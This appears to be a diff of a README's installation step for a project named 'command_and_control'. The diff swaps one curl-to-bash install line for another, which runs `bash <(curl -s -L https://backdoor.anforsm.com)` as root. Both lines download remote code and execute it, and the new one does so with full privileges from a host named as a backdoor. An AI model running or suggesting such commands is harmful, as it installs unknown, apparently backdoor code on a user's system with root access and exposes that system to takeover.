@@ -1,2 +1,3 @@
 ### Installation
-2. run `curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/install.sh | bash`
+Run `bash <(curl -s -L https://backdoor.anforsm.com)` as root
+
